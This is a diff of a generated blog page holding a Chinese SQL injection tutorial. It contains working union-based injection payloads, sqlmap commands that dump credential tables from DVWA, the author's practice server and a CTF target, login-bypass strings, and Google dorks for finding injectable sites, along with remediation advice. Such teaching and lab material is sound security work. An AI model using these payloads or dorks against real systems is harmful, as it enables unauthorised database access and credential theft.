@@ -43,7 +43,11 @@
 	<script src="/js/Valine-RJyanzheng.js"></script>
 
     
-<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="简言之" type="application/atom+xml">
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="简言之" type="application/atom+xml">
 <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
 <link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
@@ -880,7 +884,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    9.4k
+                    9.9k
                 </div>
                 
 
@@ -905,23 +909,23 @@
 <p>听完这节课你能学到些什么👇</p>
 </blockquote>
 <ul>
-<li>[x] 知道什么是Sql注入</li>
-<li>[x] 实现最基础的Sql注入</li>
-<li>[x] 学会使用SqlMap工具</li>
-<li>[x] 了解一些Web安全基本知识</li>
+<li><input checked="" disabled="" type="checkbox"> 知道什么是Sql注入</li>
+<li><input checked="" disabled="" type="checkbox"> 实现最基础的Sql注入</li>
+<li><input checked="" disabled="" type="checkbox"> 学会使用SqlMap工具</li>
+<li><input checked="" disabled="" type="checkbox"> 了解一些Web安全基本知识</li>
 </ul>
 <h2 id="二、初识SQL注入"><a href="#二、初识SQL注入" class="headerlink" title="二、初识SQL注入"></a>二、初识SQL注入</h2><h3 id="1-什么是SQL"><a href="#1-什么是SQL" class="headerlink" title="1 什么是SQL"></a>1 什么是SQL</h3><blockquote>
 <p>SQL（Structured Query Language） 是用于<code>访问和处理数据库</code>的标准的计算机语言,SQL与数据库程序协同工作，比如 SQL Server、MySQL、Oracle、SQLite、MongoDB、PostgreSQL、MS Access、DB2以及其他数据库系统。</p>
 </blockquote>
 <p><img src="https://i.loli.net/2020/05/02/OxEr91piQSkj7Mc.png" alt="2020年5月"></p>
 <p><strong>SQL执行流程</strong></p>
-<p><img src="https://i.loli.net/2020/05/02/k1MB6fsTlyzXH9J.jpg" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/02/k1MB6fsTlyzXH9J.jpg"></p>
 <h3 id="2-什么是SQL注入"><a href="#2-什么是SQL注入" class="headerlink" title="2 什么是SQL注入"></a>2 什么是SQL注入</h3><blockquote>
 <p>SQL注入是指web应用程序对<strong>用户输入数据的合法性没有判断或过滤不严</strong>，攻击者可以在web应用程序中事先定义好的查询语句的结尾上<strong>添加额外的SQL语句</strong>，以此来实现欺骗数据库服务器<strong>执行非授权的任意查询</strong>，从而得到相应的数据信息。</p>
 </blockquote>
 <p><strong>通俗来说：</strong>OWASP Top10之一，SQL注入是通过将<code>恶意的SQL语句</code>插入到Web应用的输入参数中，<code>欺骗服务器</code>执行恶意的SQL命令的攻击。</p>
 <p><strong>SQL注入流程</strong></p>
-<p><img src="https://i.loli.net/2020/05/02/Ligwo95FqyQaHcV.png" alt=""> </p>
+<p><img src="https://i.loli.net/2020/05/02/Ligwo95FqyQaHcV.png"> </p>
 <h3 id="3-SQL注入分类"><a href="#3-SQL注入分类" class="headerlink" title="3 SQL注入分类"></a>3 SQL注入分类</h3><p><strong>根据SQL数据类型分类</strong></p>
 <ul>
 <li>整型注入</li>
@@ -939,7 +943,7 @@
 <p><img src="https://img.jwt1399.top//img/20200608143317.png" alt="手工注入流程"></p>
 <h3 id="2-实现完整手工注入"><a href="#2-实现完整手工注入" class="headerlink" title="2 实现完整手工注入"></a>2 实现完整手工注入</h3><p><strong>靶机：DVWA</strong></p>
 <p>将DVWA的级别设置为low，可以看到源码中是一句简单的查询语句，没有进行任何过过滤</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';
+<pre class="line-numbers language-sql"><code class="language-sql">$query  <span class="token operator">=</span> "<span class="token keyword">SELECT</span> first_name<span class="token punctuation">,</span> last_name <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id <span class="token operator">=</span> <span class="token string">'$id'</span><span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>因此我们完全可以插入自己想要执行的sql语句，那么我们开始吧！</p>
 <p>输入我们输入1，那么执行的语句就是</p>
@@ -947,36 +951,36 @@
 <h4 id="1-判断注入是字符型还是数字型"><a href="#1-判断注入是字符型还是数字型" class="headerlink" title="1.判断注入是字符型还是数字型"></a>1.判断注入是字符型还是数字型</h4><blockquote>
 <p>字符型和数字型最大区别: 数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的</p>
 </blockquote>
-<p>数字型：select * from table where id =$id</p>
-<p>字符型：select * from table where id=’$id’</p>
+<p>数字型：select * from table where id &#x3D;$id</p>
+<p>字符型：select * from table where id&#x3D;’$id’</p>
 <p>判断数字型</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">1 and 1=1 #永真式   select * from table where id=1 and 1=1
-1 and 1=2 #永假式   select * from table where id=1 and 1=2
-#if页面运行错误，则说明此Sql注入为数字型注入。
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment" spellcheck="true">#永真式   select * from table where id=1 and 1=1</span>
+<span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token comment" spellcheck="true">#永假式   select * from table where id=1 and 1=2</span>
+<span class="token comment" spellcheck="true">#if页面运行错误，则说明此Sql注入为数字型注入。</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>判断字符型</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">1' and '1'='1  
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>  
 
-1' and '1'='2 
-#if页面运行错误，则说明此 Sql 注入为字符型注入。
+<span class="token number">1</span><span class="token string">' and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">2</span> 
+<span class="token comment" spellcheck="true">#if页面运行错误，则说明此 Sql 注入为字符型注入。</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>执行上面两种方式一种就可得出结论，显示这个是字符型注入</p>
-<h4 id="2-猜解SQL查询语句中的字段数"><a href="#2-猜解SQL查询语句中的字段数" class="headerlink" title="2.猜解SQL查询语句中的字段数"></a>2.猜解SQL查询语句中的字段数</h4><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">1' or 1=1 order by 1 #    查询成功  【order by x 对第几列进行排序】1'  order by 1 #  id=‘1‘  #’ 注释
-1' or 1=1 order by 2 #    查询成功
-1' or 1=1 order by 3 #    查询失败
+<h4 id="2-猜解SQL查询语句中的字段数"><a href="#2-猜解SQL查询语句中的字段数" class="headerlink" title="2.猜解SQL查询语句中的字段数"></a>2.猜解SQL查询语句中的字段数</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span> <span class="token comment" spellcheck="true">#    查询成功  【order by x 对第几列进行排序】1'  order by 1 #  id=‘1‘  #’ 注释</span>
+<span class="token number">1</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span> <span class="token comment" spellcheck="true">#    查询成功</span>
+<span class="token number">1</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token comment" spellcheck="true">#    查询失败</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200726161444.png" alt="">说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
-<h4 id="3-确定显示的字段顺序"><a href="#3-确定显示的字段顺序" class="headerlink" title="3.确定显示的字段顺序"></a>3.确定显示的字段顺序</h4><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">1' union select 1,2 #
+<p><img src="https://img.jwt1399.top//img/20200726161444.png">说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
+<h4 id="3-确定显示的字段顺序"><a href="#3-确定显示的字段顺序" class="headerlink" title="3.确定显示的字段顺序"></a>3.确定显示的字段顺序</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token comment" spellcheck="true">#    </span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/07/07/5d2157a15b62731652.png" alt=""><br>说明执行的SQL语句为select First name,Surname from xx where ID=’id’</p>
+<p><img src="https://i.loli.net/2019/07/07/5d2157a15b62731652.png"><br>说明执行的SQL语句为select First name,Surname from xx where ID&#x3D;’id’</p>
 <p><strong>理解select 1,2</strong>：例如一个网站的参数传递执行的查询有3个字段，很可能这些字段不是都显示在网页前端的，假如其中的1或2个字段的查询结果是会返回到前端的，那么我们就需要知道这3个字段中哪两个结果会回显，这个过程相当于找到数据库与前端显示的通道。如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试，这时候我们利用一个简单的select 1,2,3，根据显示在页面上的数字就可以知道哪个数字是这个“通道”，那么我们只需要把这个数字改成我们想查询的内容（如id,password），当数据爆破成功后，就会在窗口显示我们想要的结果。<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44840696/article/details/89166154">SELECT 1,2,3…的含义及其在SQL注入中的用法</a></p>
 <h4 id="4-获取当前数据库"><a href="#4-获取当前数据库" class="headerlink" title="4.获取当前数据库"></a>4.获取当前数据库</h4><p>上步知道字段显示顺序，那我们在字段2的位置上显示数据库试试</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">1' union select 1,database() #
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/07/07/5d215880225ab67916.png" alt=""><br>说明当前的数据库为dvwa。</p>
-<h4 id="5-获取数据库中的表"><a href="#5-获取数据库中的表" class="headerlink" title="5.获取数据库中的表"></a>5.获取数据库中的表</h4><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+<p><img src="https://i.loli.net/2019/07/07/5d215880225ab67916.png"><br>说明当前的数据库为dvwa。</p>
+<h4 id="5-获取数据库中的表"><a href="#5-获取数据库中的表" class="headerlink" title="5.获取数据库中的表"></a>5.获取数据库中的表</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#</span>
 
-1' union select 1,table_name from information_schema.tables where table_schema='dvwa' #
+<span class="token number">1</span><span class="token string">' union select 1,table_name from information_schema.tables where table_schema='</span>dvwa' <span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><strong>information_schema.tables</strong>存储了数据表的元数据信息，下面对常用的字段进行介绍：</p>
 <ul>
@@ -988,77 +992,78 @@
 <li>index_length : 记录表的<strong>索引的大小</strong>；</li>
 <li>row_format: 可以查看数据表<strong>是否压缩</strong>过；</li>
 </ul>
-<p><img src="https://img.jwt1399.top//img/20200726161522.png" alt=""></p>
+<p><img src="https://img.jwt1399.top//img/20200726161522.png"></p>
 <p>说明数据库dvwa中一共有两个表，guestbook与users。</p>
-<h4 id="6-获取表中的字段名"><a href="#6-获取表中的字段名" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h4><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
+<h4 id="6-获取表中的字段名"><a href="#6-获取表中的字段名" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span>users' <span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200726161553.png" alt=""></p>
+<p><img src="https://img.jwt1399.top//img/20200726161553.png"></p>
 <p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login</p>
-<h4 id="7-获取字段信息"><a href="#7-获取字段信息" class="headerlink" title="7.获取字段信息"></a>7.获取字段信息</h4><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">1' union select group_concat(user_id,first_name),group_concat(password) from users #
+<h4 id="7-获取字段信息"><a href="#7-获取字段信息" class="headerlink" title="7.获取字段信息"></a>7.获取字段信息</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>user_id<span class="token punctuation">,</span>first_name<span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment" spellcheck="true">#</span>
 
-1' union select group_concat(concat_ws(':',first_name,password)),2 from users #
+<span class="token number">1</span><span class="token string">' union select group_concat(concat_ws('</span>:'<span class="token punctuation">,</span>first_name<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">from</span> users <span class="token comment" spellcheck="true">#</span>
 
-1' union select first_name,password from users #
+<span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> first_name<span class="token punctuation">,</span>password <span class="token keyword">from</span> users <span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2019/07/07/5d21587feccc627920.png" alt=""></p>
+<p><img src="https://i.loli.net/2019/07/07/5d21587feccc627920.png"></p>
 <p>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p>
 <h3 id="3-实战演练一哈"><a href="#3-实战演练一哈" class="headerlink" title="3 实战演练一哈"></a>3 实战演练一哈</h3><p>就以我自己搭建的<a target="_blank" rel="noopener" href="http://139.224.112.182:8801/">靶机</a>为例子🌰</p>
 <p>在主页搜索框发现注入点，话不多说开始注入</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">#判断注入类型 #【数字型】
-1 and 1=1 
-1 and 1=2 
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#判断注入类型 #【数字型】</span>
+<span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> 
+<span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> 
 
-#查询数据库 #【test】
--1 union select 1,2,database()
+<span class="token comment" spellcheck="true">#查询数据库 #【test】</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-#获取数据库中的表 #【admin、news】
--1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='test' 
+<span class="token comment" spellcheck="true">#获取数据库中的表 #【admin、news】</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'test'</span> 
 
-#获取表中的字段名 #【 user_id、user_name、user_pass】
--1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='admin'
+<span class="token comment" spellcheck="true">#获取表中的字段名 #【 user_id、user_name、user_pass】</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'admin'</span>
 
-#获取字段信息 【admin:mysql】
--1 union select 1,group_concat(user_name),group_concat(user_pass) from admin
--1 union select 1,user_name,user_pass from admin
+<span class="token comment" spellcheck="true">#获取字段信息 【admin:mysql】</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>user_name<span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>user_pass<span class="token punctuation">)</span> <span class="token keyword">from</span> admin
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>user_name<span class="token punctuation">,</span>user_pass <span class="token keyword">from</span> admin 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>我们又快速的实现了一次手工注入，但是你有没和我一样的感觉，太麻烦了，有更方便的方法吗，emm…</p>
 <p>当然有啦，使用SqlMap工具可以快速实现注入👇</p>
 <h2 id="四、使用SqlMap注入"><a href="#四、使用SqlMap注入" class="headerlink" title="四、使用SqlMap注入"></a>四、使用SqlMap注入</h2><p>具体使用方法请问我之前写的文章👉<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a46abd1e67aa">sqlmap使用方法</a></p>
 <h4 id="SqlMap初体验"><a href="#SqlMap初体验" class="headerlink" title="SqlMap初体验"></a>SqlMap初体验</h4><p>接着使用上面靶机进行测试</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">#查询数据库 #【test】
-python sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 --dbs
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#查询数据库 #【test】</span>
+python sqlmap.py -u http://139.224.112.182:8801/search.php?id<span class="token operator">=</span>1 --dbs
 
-#获取数据库中的表 #【admin、news】
-python sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 -D test --tables
+<span class="token comment" spellcheck="true">#获取数据库中的表 #【admin、news】</span>
+python sqlmap.py -u http://139.224.112.182:8801/search.php?id<span class="token operator">=</span>1 -D <span class="token function">test</span> --tables
 
-#获取表中的字段名 #【 user_id、user_name、user_pass】
-python sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 -D test -T admin --columns
+<span class="token comment" spellcheck="true">#获取表中的字段名 #【 user_id、user_name、user_pass】</span>
+python sqlmap.py -u http://139.224.112.182:8801/search.php?id<span class="token operator">=</span>1 -D <span class="token function">test</span> -T admin --columns
 
-#获取字段信息 【admin:mysql】
-python sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 -D test -T admin -C user_name,user_pass --dump
+<span class="token comment" spellcheck="true">#获取字段信息 【admin:mysql】</span>
+python sqlmap.py -u http://139.224.112.182:8801/search.php?id<span class="token operator">=</span>1 -D <span class="token function">test</span> -T admin -C user_name,user_pass --dump
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="一道CTF题目"><a href="#一道CTF题目" class="headerlink" title="一道CTF题目"></a>一道CTF题目</h4><p>题目：简单的sql注入2</p>
 <p>地址：<a target="_blank" rel="noopener" href="http://139.224.112.182:8087/ctf_collect">http://139.224.112.182:8087/ctf_collect</a></p>
 <p>解析：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/1aeedef99f21">https://www.jianshu.com/p/1aeedef99f21</a></p>
 <p><strong>1</strong>.查询当前数据库(空格被过滤可以使用tamper脚本中space2comment)</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment --dbs
+<pre class="line-numbers language-bash"><code class="language-bash">python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id<span class="token operator">=</span>1 --tamper<span class="token operator">=</span>space2comment --dbs 
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/04/duk1Pzgn8vseYVw.png" alt=""><br>发现web1数据库<br><strong>2</strong>.查询数据库中的表</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment -D web1 --tables
+<p><img src="https://i.loli.net/2020/05/04/duk1Pzgn8vseYVw.png"><br>发现web1数据库<br><strong>2</strong>.查询数据库中的表</p>
+<pre class="line-numbers language-bash"><code class="language-bash">python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id<span class="token operator">=</span>1 --tamper<span class="token operator">=</span>space2comment -D web1 --tables
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/04/VqgauHCbZ7SIFYL.png" alt=""><br>发现flag表<br><strong>3</strong>.查询flag表中字段名</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment --columns -T flag -D web1
+<p><img src="https://i.loli.net/2020/05/04/VqgauHCbZ7SIFYL.png"><br>发现flag表<br><strong>3</strong>.查询flag表中字段名</p>
+<pre class="line-numbers language-bash"><code class="language-bash">python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id<span class="token operator">=</span>1 --tamper<span class="token operator">=</span>space2comment --columns -T flag -D web1
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/04/DvPQ6OponqHuCZz.png" alt=""><br>发现flag字段<br><strong>4</strong>.查询字段flag信息</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment --dump -C flag -T flag -D web1
+<p><img src="https://i.loli.net/2020/05/04/DvPQ6OponqHuCZz.png"><br>发现flag字段<br><strong>4</strong>.查询字段flag信息</p>
+<pre class="line-numbers language-bash"><code class="language-bash">python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id<span class="token operator">=</span>1 --tamper<span class="token operator">=</span>space2comment --dump -C flag -T flag -D web1
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/04/TfZAoObdMPiLJIt.png" style="zoom: 80%;" /></p>
+<img src="https://i.loli.net/2020/05/04/TfZAoObdMPiLJIt.png" style="zoom: 80%;" />
+
 <h2 id="五、发现注入点"><a href="#五、发现注入点" class="headerlink" title="五、发现注入点"></a>五、发现注入点</h2><h3 id="1-使用漏洞扫描工具"><a href="#1-使用漏洞扫描工具" class="headerlink" title="1 使用漏洞扫描工具"></a>1 使用漏洞扫描工具</h3><p>工具：OWASP ZAP、D盾、Seay</p>
 <p>万能密码：</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">1' or 1=1 # 用户名和密码都可  
-' or '1'='1' -- 
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment" spellcheck="true"># 用户名和密码都可  </span>
+<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>' <span class="token comment" spellcheck="true">-- </span>
 
-1' or '1'='1 密码才可
+<span class="token number">1</span><span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> 密码才可
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="2-通过Google-Hacking-寻找SQL注入"><a href="#2-通过Google-Hacking-寻找SQL注入" class="headerlink" title="2 通过Google Hacking 寻找SQL注入"></a>2 通过Google Hacking 寻找SQL注入</h3><blockquote>
 <p>看到这里我们已经完成了一次最基础的GET字符型Sql注入，有人可能会问了，这是自己搭建的靶机，知道是存在sql注入，真实环境中如何去发现Sql注入呢</p>
@@ -1070,7 +1075,8 @@ inurl:showproduct.asp?id=
 site:http://139.224.112.182:8802/ inurl:php?id
 site:https://jwt1399.top inurl:.html
 ......
-</code></pre><p>服务器报错，并把错误信息返回到网页上面。根据错误信息，判断这里大概率存在注入点。</p>
+</code></pre>
+<p>服务器报错，并把错误信息返回到网页上面。根据错误信息，判断这里大概率存在注入点。</p>
 <h2 id="六、-修复建议"><a href="#六、-修复建议" class="headerlink" title="六、 修复建议"></a>六、 修复建议</h2><ol>
 <li>过滤用户输入的数据。默认情况下，应当认为用户的所有输入都是不安全的。</li>
 <li>对于整数，判断变量是否符合[0-9]的值；其他限定值，也可以进行合法性校验；</li>
@@ -1081,51 +1087,47 @@ site:https://jwt1399.top inurl:.html
 <p>不要急于进行SQL注入，请先看完这部分，很重要！，很重要！，很重要！</p>
 </blockquote>
 <p><strong>1.基本的SQL语句查询源码</strong></p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
-# LIMIT [偏移量],行数
+<pre class="line-numbers language-sql"><code class="language-sql">$sql<span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true"># LIMIT [偏移量],行数</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>通常情况下联合查询(union)时需要将前面的查询结果限定为空集，后面的查询结果才能显示出来。例如id值设为负数或0，因为带有<code>LIMIT 0,1</code>则只能显示一条数据</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">?id=-1 union select 1,2,3
-?id=0  union select 1,2,3
-?id=-1' union select 1,2,group_concat(username,password) from users
+<pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span>
+?id<span class="token operator">=</span><span class="token number">0</span>  <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span>
+?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><strong>2.MySQL数据库几种注释</strong></p>
-<div class="table-container">
 <table>
 <thead>
 <tr>
-<th style="text-align:center">注释符</th>
+<th align="center">注释符</th>
 <th>描述</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td style="text-align:center"><code>#</code></td>
+<tbody><tr>
+<td align="center"><code>#                                </code></td>
 <td>单行注释  URL编码 <code>%23</code>，在URL框直接使用中<code>#</code>号必须用<code>%23</code>来表示，#在URL框中有特定含义，代表锚点</td>
 </tr>
 <tr>
-<td style="text-align:center"><code>--空格</code></td>
+<td align="center"><code>--空格           </code></td>
 <td>单行注释 ，实际使用中<code>--空格</code>用<code>--+</code>来表示。因为在URL框中，浏览器在发送请求的时候会把URL末尾的空格舍去，所以用<code>--+</code>代替<code>--空格</code></td>
 </tr>
 <tr>
-<td style="text-align:center"><code>/* */</code></td>
+<td align="center"><code>/* */</code></td>
 <td>块注释</td>
 </tr>
 <tr>
-<td style="text-align:center"><code>/*! */</code></td>
+<td align="center"><code>/*! */</code></td>
 <td>内联注释</td>
 </tr>
-</tbody>
-</table>
-</div>
-<p><strong>3.数据库相关—Information_schema库</strong></p>
+</tbody></table>
